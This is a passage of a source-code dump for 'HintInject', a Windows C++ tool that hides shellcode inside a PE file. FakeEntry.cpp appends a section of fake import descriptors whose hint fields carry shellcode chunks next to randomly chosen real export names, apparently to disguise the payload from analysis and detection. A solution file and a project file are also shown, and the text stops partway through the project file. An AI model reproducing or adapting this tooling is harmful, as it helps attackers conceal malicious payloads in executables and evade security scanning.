Project Path: arc_gmh5225_HintInject_qx5rkiho

Source Tree:

```txt
arc_gmh5225_HintInject_qx5rkiho
├── DllNamesForFakeImports.h
├── FakeEntry.cpp
├── FakeEntry.h
├── HintInject.sln
├── HintInject.vcxproj
├── HintInject.vcxproj.filters
├── HintInjectLoader
│   ├── HintInjectLoader.vcxproj
│   ├── HintInjectLoader.vcxproj.filters
│   └── Main.cpp
├── Main.cpp
├── README.md
├── Structs.h
├── Utils.cpp
└── Utils.h

```

`DllNamesForFakeImports.h`:

```h
#pragma once
// I added these for the fake entries. If your shellcode is bigger than the size that those dlls provide, you can add it to this list.
static LPCSTR dllNames[] = {"user32.dll","advapi32.dll","gdi32.dll","wininet.dll","comctl32.dll","shell32.dll","wsock32.dll","oleaut32.dll","ws2_32.dll","urlmon.dll"};
static int numberOfDllNames = sizeof(dllNames) / sizeof(LPCSTR);
```

`FakeEntry.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <cmath>
#include <set>
#include "DllNamesForFakeImports.h"
#include "Utils.h"
#include "Structs.h"

#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))
FAKEIMPORT* fakeImportList = NULL;
int numberOfRequiredDLLs = 0;

// Function for translation of RVA to file offset
DWORD Rva2Offset(DWORD dwRva, PBYTE uiBaseAddress) {
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

int CalculateNumberOfFakeEntries(int numberOfChunks,FAKEIMPORT* fakeImportList) {
	int returnValue = 0;
	char dllPath[MAX_PATH] = { 0x00 };
	uint64_t dllSize = 0;
	for (int i = 0; i < numberOfDllNames; i++) {
		if (numberOfChunks <= 0) {
			break;
		}
		memset(dllPath, 0x00, MAX_PATH);
		sprintf_s(dllPath, "C:\\Windows\\System32\\%s", dllNames[i]);
		PBYTE dllBuffer = ReadFileFromDisk(dllPath, dllSize);
		if (dllBuffer == NULL || dllSize == 0) {
			// TODO: fix missing dll
			std::cout << "[!] Error on dll read: " << dllPath<<std::endl;
			std::cout << "[!] Remove it from the dllNames array !" << std::endl;
			return 0;
		}
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
		PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dllBuffer));
		DWORD numberOfNames = imageExportDirectory->NumberOfNames;
		returnValue++;
		fakeImportList[i].name = dllNames[i];
		fakeImportList[i].numberOfImports = (numberOfChunks > numberOfNames) ? numberOfNames : numberOfChunks;
		fakeImportList[i].offsetArray = (PBYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fakeImportList[i].numberOfImports*sizeof(PBYTE *));
		if (fakeImportList[i].offsetArray == NULL) {
			std::cout << "[!] Error on heap allocation !" << std::endl;
			return 0;
		}
		numberOfChunks -= numberOfNames;
	}
	if (numberOfChunks > 0) {
		std::cout << "[!] Shellcode size is bigger than the exports of dlls in the dllNames array !" << std::endl;
		std::cout << "[!] Add new dll names to the dllNames array !" << std::endl;
		return 0;
	}
	return returnValue;
}

LPCSTR* GetImportNamesFromIndex(PBYTE dllBuffer, int* selectedIndexes, int indexArraySize) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dllBuffer));
	PDWORD nameArray = (PDWORD)(dllBuffer + Rva2Offset(imageExportDirectory->AddressOfNames,dllBuffer));
	LPCSTR *returnArrayAddr = (LPCSTR *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, indexArraySize * sizeof(LPCSTR));
	if (returnArrayAddr == NULL) {
		std::cout << "[!] Error on heap allocation !" << std::endl;
		return NULL;
	}
	PCHAR tmpNamePtr = NULL;
	int selectedIndex = 0;
	DWORD rvaOfName = 0;
	for (int i = 0; i < indexArraySize; i++) {
		selectedIndex = selectedIndexes[i];
		rvaOfName = nameArray[selectedIndex];
		tmpNamePtr = (PCHAR)(dllBuffer + Rva2Offset(rvaOfName, dllBuffer));
		returnArrayAddr[i] = (LPCSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(tmpNamePtr)+1);
		if (returnArrayAddr[i] == NULL) {
			std::cout << "[!] Error on heap allocation !" << std::endl;
			return NULL;
		}
		memset((void *) returnArrayAddr[i], 0x00, strlen(tmpNamePtr) + 1);
		memcpy((void*) returnArrayAddr[i], tmpNamePtr, strlen(tmpNamePtr));
	}
	return returnArrayAddr;
}

LPCSTR* SelectDLLEntries(LPCSTR dllName, uint64_t numberOfDesiredFunctions) {
	char dllPath[MAX_PATH] = { 0x00 };
	uint64_t dllSize = 0;
	sprintf_s(dllPath, "C:\\Windows\\System32\\%s", dllName);
	PBYTE dllBuffer = ReadFileFromDisk(dllPath, dllSize);
	if (dllBuffer == NULL || dllSize == 0) {
		std::cout << "[!] Error on dll read" << std::endl;
		return NULL;
	}
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)(dllBuffer + dosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBuffer + Rva2Offset(imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,dllBuffer));
	DWORD numberOfNames = imageExportDirectory->NumberOfNames;
	PDWORD nameArray = (PDWORD)(dllBuffer + imageExportDirectory->AddressOfNames);
	int *selectedIndexes = (int *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfDesiredFunctions *sizeof(int));
	if (selectedIndexes == NULL) {
		std::cout << "[!] Error on heap allocation !" << std::endl;
		return NULL;
	}
	std::set<int> indexes;
	while (indexes.size() < numberOfDesiredFunctions) {
		indexes.insert(GetRandomNumber(0,numberOfNames-1));
	}
	int indexCounter = 0;
	for (std::set<int>::iterator it = indexes.begin(); it != indexes.end(); ++it,indexCounter++) {
		selectedIndexes[indexCounter] = *it; // Note the "*" here
	}
	LPCSTR* returnValue = GetImportNamesFromIndex(dllBuffer,selectedIndexes,numberOfDesiredFunctions);
	HeapFree(GetProcessHeap(), 0, selectedIndexes);
	HeapFree(GetProcessHeap(), 0, dllBuffer);
	return returnValue;
}

PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOfChunks, uint64_t& newFileSize) {
	PIMAGE_DOS_HEADER imageDosHeader;
	PIMAGE_NT_HEADERS imageNtHeader;
	PIMAGE_NT_HEADERS newImageNtHeader;
	IMAGE_NT_HEADERS backupNtHeader;
	DWORD dwExistingImportDescriptorEntryCount;
	DWORD dwNewImportDescriptorEntryCount;
	PIMAGE_IMPORT_DESCRIPTOR existingImportDescriptorAddr;
	PIMAGE_SECTION_HEADER sectionHeaderArray;
	PIMAGE_SECTION_HEADER newSectionHeaderArray;
	PBYTE newFileBuffer = NULL;
	uint64_t functionStringLengths = 0;
	uint64_t dllNamesSize = 0;
	fakeImportList = (FAKEIMPORT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfDllNames*sizeof(FAKEIMPORT));
	if (fakeImportList == NULL) {
		std::cout << "[!] Error on Heap Allocation !" << std::endl;
		return NULL;
	}
	imageDosHeader = (PIMAGE_DOS_HEADER)oldFileBuffer;
	imageNtHeader = (PIMAGE_NT_HEADERS)(oldFileBuffer + imageDosHeader->e_lfanew);
	sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)imageNtHeader) + sizeof(IMAGE_NT_HEADERS));
	// calculate existing number of imported dll modules
	dwExistingImportDescriptorEntryCount = imageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
	// Actually on my computer, loader binary has one import.
	numberOfRequiredDLLs = CalculateNumberOfFakeEntries(numberOfChunks,fakeImportList);
	if (numberOfRequiredDLLs == 0) {
		return NULL;
	}
	std::cout << "[+] Number of DLL for storing shellcode is: " << numberOfRequiredDLLs << std::endl;
	if (dwExistingImportDescriptorEntryCount == 0){
		// the target process doesn't have any imported dll entries, 1 for last entry which is 0 and fakes
		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs +1;
	}
	else{
		// add fake entries
		dwNewImportDescriptorEntryCount = dwExistingImportDescriptorEntryCount + numberOfRequiredDLLs;
	}
	// Select names from the DLLs
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		fakeImportList[i].nameofImports = SelectDLLEntries(fakeImportList[i].name, fakeImportList[i].numberOfImports);
		if (fakeImportList[i].nameofImports == NULL) {
			std::cout << "[!] Error on reading DLL imports " << fakeImportList[i].name << std::endl;
			return NULL;
		}
	}
	// Calculate the length of import function names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			functionStringLengths += strlen(fakeImportList[i].nameofImports[j]);
			functionStringLengths++;
		}
	}
	// Calculate the length of dll names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		dllNamesSize = dllNamesSize + strlen(fakeImportList[i].name) + 1;
	}
	// Region for DLL Names + RVAs for Strings + ILT and IAT --> 2* NumberOfChunks+1 (+1 means null entry) * sizeof THUNK + Import Directory entries
	uint64_t totalLengthForSection = dllNamesSize + functionStringLengths + sizeof(WORD) * numberOfChunks + 2 * (numberOfChunks + 1*numberOfRequiredDLLs) * sizeof(IMAGE_THUNK_DATA) + dwNewImportDescriptorEntryCount * sizeof(IMAGE_IMPORT_DESCRIPTOR);
	int numberOfSections = imageNtHeader->FileHeader.NumberOfSections;
	uint64_t newSectionOffset = sectionHeaderArray[numberOfSections - 1].PointerToRawData + sectionHeaderArray[numberOfSections - 1].SizeOfRawData;
	//Area after the last element in the section header array
	PIMAGE_SECTION_HEADER newSectionHeader = &sectionHeaderArray[numberOfSections];
	bool checkBoundary = ((PBYTE)newSectionHeader + sizeof(IMAGE_SECTION_HEADER) - oldFileBuffer) < sectionHeaderArray[0].PointerToRawData;
	if (checkBoundary) {
		memcpy(newSectionHeader->Name, ".rrdata", IMAGE_SIZEOF_SHORT_NAME);
		newSectionHeader->VirtualAddress = P2ALIGNUP(
			sectionHeaderArray[numberOfSections - 1].VirtualAddress + sectionHeaderArray[numberOfSections - 1].Misc.VirtualSize,
			imageNtHeader->OptionalHeader.SectionAlignment
		);
		//File alignment for PE File, same alignment problem but this is for disk
		newSectionHeader->SizeOfRawData = P2ALIGNUP(totalLengthForSection, imageNtHeader->OptionalHeader.FileAlignment);
		//Section alignment for memory
		newSectionHeader->Misc.VirtualSize = P2ALIGNUP((totalLengthForSection), imageNtHeader->OptionalHeader.SectionAlignment);
		newSectionHeader->Characteristics = 0xC0000040;
		//Offset for file
		newSectionHeader->PointerToRawData = newSectionOffset;
		// Section Alignment trick and put correct address wrt last section
		imageNtHeader->FileHeader.NumberOfSections += 1;
		//Now it has new section size
		newFileSize = P2ALIGNUP(totalLengthForSection, imageNtHeader->OptionalHeader.FileAlignment) + newSectionOffset;
		//New Section Offset is actually end of the file
		newFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newFileSize);
		if (!newFileBuffer) {
			std::cout << ("[!] Failed to allocate new memory for the new file\n");
			return NULL;
		}
		// Copy until end of the NT Headers
		memcpy(newFileBuffer, oldFileBuffer, newSectionOffset);
		newImageNtHeader = (PIMAGE_NT_HEADERS)(newFileBuffer + imageDosHeader->e_lfanew);
		newSectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)newImageNtHeader) + sizeof(IMAGE_NT_HEADERS));
		newImageNtHeader->OptionalHeader.SizeOfImage =
			newSectionHeaderArray[newImageNtHeader->FileHeader.NumberOfSections - 1].VirtualAddress +
			newSectionHeaderArray[newImageNtHeader->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
	}
	else {
		std::cout << "[!] No room left for new section header array !" << std::endl;
	}
	return newFileBuffer;
}


bool AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)ntHeaders) + sizeof(IMAGE_NT_HEADERS));
	// Address of the beginning of the function
	PBYTE sectionStart = fileBuffer + sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
	// Import Lookup Table Entries
	PIMAGE_THUNK_DATA importLookupTableTemp;
	PIMAGE_IMPORT_DESCRIPTOR newDllImportDescriptors = (PIMAGE_IMPORT_DESCRIPTOR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(IMAGE_IMPORT_DESCRIPTOR)*(numberOfRequiredDLLs+1));
	PIMAGE_IMPORT_DESCRIPTOR oldDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(fileBuffer + Rva2Offset(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, fileBuffer));
	DWORD dwExistingImportDescriptorEntryCount = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
	DWORD dwNewImportDescriptorEntryCount = 0;
	uint64_t functionStringLengths = 0;
	uint64_t dllNamesSize = 0;
	uint64_t offsetCursor = 0;
	uint64_t chunkIndex = 0;
	uint64_t cursorOffsetForILT = 0;
	if (newDllImportDescriptors == NULL) {
		std::cout << "[!] Error on Heap Allocation !" << std::endl;
		return false;
	}
	// Calculate the total length of function strings
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			functionStringLengths += strlen(fakeImportList[i].nameofImports[j]);
			functionStringLengths++;
		}
	}
	// Calculate the length of dll names
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		dllNamesSize = dllNamesSize + strlen(fakeImportList[i].name) + 1;
	}
	
	if (dwExistingImportDescriptorEntryCount == 0)
	{
		// the target process doesn't have any imported dll entries - 1 for last and 1 for new
		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs + 1;
	}
	else
	{
		// add one extra dll entry
		dwNewImportDescriptorEntryCount = dwExistingImportDescriptorEntryCount + numberOfRequiredDLLs;
	}
	// Size of new Import Directory
	DWORD dwNewImportDescriptorListDataLength = dwNewImportDescriptorEntryCount * sizeof(IMAGE_IMPORT_DESCRIPTOR);
	// Section address after the directory - From that address we put function names and dll names
	PBYTE freeMemoryStartAfterDir = sectionStart + dwNewImportDescriptorListDataLength;
	// Section address after the function names - From that address we put dll names
	PBYTE freeMemoryStartAfterFunctionNames = freeMemoryStartAfterDir + dllNamesSize + functionStringLengths  + sizeof(WORD) * numberOfChunks;
	memset(freeMemoryStartAfterDir, 0x00, dllNamesSize + functionStringLengths + sizeof(WORD) * numberOfChunks);
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		memcpy(freeMemoryStartAfterDir+offsetCursor, fakeImportList[i].name, strlen(fakeImportList[i].name));
		fakeImportList[i].nameAddr = freeMemoryStartAfterDir + offsetCursor;
		offsetCursor = offsetCursor + strlen(fakeImportList[i].name) + 1;
	}
	
	// Put shellcode chunks after the dll names
	PIMAGE_IMPORT_BY_NAME hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(freeMemoryStartAfterDir + dllNamesSize); 
	offsetCursor = 0;
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
			memcpy(&(hintNameEntries->Hint), &hintArray[chunkIndex++], sizeof(WORD));
			memcpy(&(hintNameEntries->Name), fakeImportList[i].nameofImports[j], strlen(fakeImportList[i].nameofImports[j]));
			// Save the hint/name table entries address for saving
			fakeImportList[i].offsetArray[j] = (PBYTE ) (&(hintNameEntries->Hint));
			hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(((PBYTE)hintNameEntries) + sizeof(WORD) + strlen(fakeImportList[i].nameofImports[j]) + 1);
		}
	}
	
	// Put the old directory
	memcpy(sectionStart, oldDirectory, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

	PBYTE thunkAddress = freeMemoryStartAfterDir + dllNamesSize;
	DWORD sectionStartOffset = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
	DWORD sectionRVA = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
	// True
	// set import lookup table and import address table values

	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		importLookupTableTemp = (PIMAGE_THUNK_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		if (importLookupTableTemp == NULL) {
			std::cout << "[!] Error on Heap Allocation !" << std::endl;
			return false;
		}
		importLookupTableTemp[fakeImportList[i].numberOfImports].u1.AddressOfData = 0;
		// RVA Calculation is section rva + raw offset from the raw offset of the section
		importLookupTableTemp[0].u1.AddressOfData = (sectionRVA + (fakeImportList[i].offsetArray[0] - fileBuffer) - sectionStartOffset);
		for (int j = 1; j < fakeImportList[i].numberOfImports; j++) {
			importLookupTableTemp[j].u1.AddressOfData = (DWORD)(sectionRVA  + (fakeImportList[i].offsetArray[j] - fileBuffer) - sectionStartOffset);
		}
		// Copy ILT of ith fake dll entry
		memcpy(freeMemoryStartAfterFunctionNames+cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		fakeImportList[i].originalFirstThunkAddr = freeMemoryStartAfterFunctionNames + cursorOffsetForILT;
		cursorOffsetForILT = cursorOffsetForILT + sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1);
		// Copy IAT of ith fake dll entry
		memcpy(freeMemoryStartAfterFunctionNames + cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
		fakeImportList[i].firstThunkAddr = freeMemoryStartAfterFunctionNames + cursorOffsetForILT;
		cursorOffsetForILT = cursorOffsetForILT + sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1);
		HeapFree(GetProcessHeap(), 0, importLookupTableTemp);
	}

	
	// We need one for Import Lookup Table, one for Import Address Table - OriginalFirstThunk and FirstThunk
	for (int i = 0; i < numberOfRequiredDLLs; i++) {
		newDllImportDescriptors[i].OriginalFirstThunk = (DWORD)(fakeImportList[i].originalFirstThunkAddr - fileBuffer - sectionStartOffset + sectionRVA);
		newDllImportDescriptors[i].TimeDateStamp = 0;
		newDllImportDescriptors[i].ForwarderChain = 0;
		newDllImportDescriptors[i].Name = (DWORD)(fakeImportList[i].nameAddr - fileBuffer - sectionStartOffset + sectionRVA);
		newDllImportDescriptors[i].FirstThunk = (DWORD)(fakeImportList[i].firstThunkAddr - fileBuffer - sectionStartOffset + sectionRVA );
	}
	
	// end of import descriptor chain
	newDllImportDescriptors[numberOfRequiredDLLs].OriginalFirstThunk = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].TimeDateStamp = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].ForwarderChain = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].Name = 0;
	newDllImportDescriptors[numberOfRequiredDLLs].FirstThunk = 0;

	// TODO: Debug this value it may not be true
	memcpy(sectionStart + dwNewImportDescriptorListDataLength - sizeof(IMAGE_IMPORT_DESCRIPTOR) * (numberOfRequiredDLLs + 1), newDllImportDescriptors, sizeof(IMAGE_IMPORT_DESCRIPTOR)* (numberOfRequiredDLLs + 1));
	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = dwNewImportDescriptorListDataLength;
	return true;
}

```

`FakeEntry.h`:

```h
#pragma once
PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOfChunks, uint64_t& newFileSize);
bool AddNewImportEntry(PBYTE fileBuffer, PWORD hintArray, uint64_t numberOfChunks);
```

`HintInject.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.32407.337
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HintInject", "HintInject.vcxproj", "{EA98E741-A1BC-4D6B-B702-9659DE39A60C}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HintInjectLoader", "HintInjectLoader\HintInjectLoader.vcxproj", "{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		JustLoader|x64 = JustLoader|x64
		JustLoader|x86 = JustLoader|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Debug|x64.ActiveCfg = Debug|x64
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Debug|x64.Build.0 = Debug|x64
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Debug|x86.ActiveCfg = Debug|Win32
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Debug|x86.Build.0 = Debug|Win32
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.JustLoader|x64.ActiveCfg = JustLoader|x64
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.JustLoader|x86.ActiveCfg = JustLoader|Win32
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.JustLoader|x86.Build.0 = JustLoader|Win32
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Release|x64.ActiveCfg = Release|x64
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Release|x64.Build.0 = Release|x64
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Release|x86.ActiveCfg = Release|Win32
		{EA98E741-A1BC-4D6B-B702-9659DE39A60C}.Release|x86.Build.0 = Release|Win32
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Debug|x64.ActiveCfg = Debug|x64
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Debug|x64.Build.0 = Debug|x64
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Debug|x86.ActiveCfg = Debug|Win32
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Debug|x86.Build.0 = Debug|Win32
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.JustLoader|x64.ActiveCfg = JustLoader|x64
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.JustLoader|x64.Build.0 = JustLoader|x64
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.JustLoader|x86.ActiveCfg = JustLoader|Win32
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Release|x64.ActiveCfg = Release|x64
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Release|x86.ActiveCfg = Release|Win32
		{F17D44F3-C60A-4B9E-BAF5-7A91FFD2E990}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D0AA1F8E-33F6-459D-B013-537E3EC1F14B}
	EndGlobalSection
EndGlobal

```

`HintInject.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="JustLoader|Win32">
      <Configuration>JustLoader</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="JustLoader|x64">
      <Configuration>JustLoader</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ea98e741-a1bc-4d6b-b702-9659de39a60c}</ProjectGuid>
    <RootNamespace>HintInject</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='JustLoader|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
